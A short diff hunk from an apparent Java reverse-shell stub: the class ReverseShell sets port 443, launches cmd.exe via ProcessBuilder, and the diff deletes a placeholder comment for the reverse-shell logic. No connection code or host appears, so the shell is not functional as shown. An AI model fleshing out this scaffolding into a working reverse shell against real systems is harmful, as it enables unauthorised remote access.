@@ -15,7 +15,6 @@ public class ReverseShell {
         int port = 443;
         String cmd = "cmd.exe";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        // Your reverse shell logic here
         return "Exit";
     }
 }
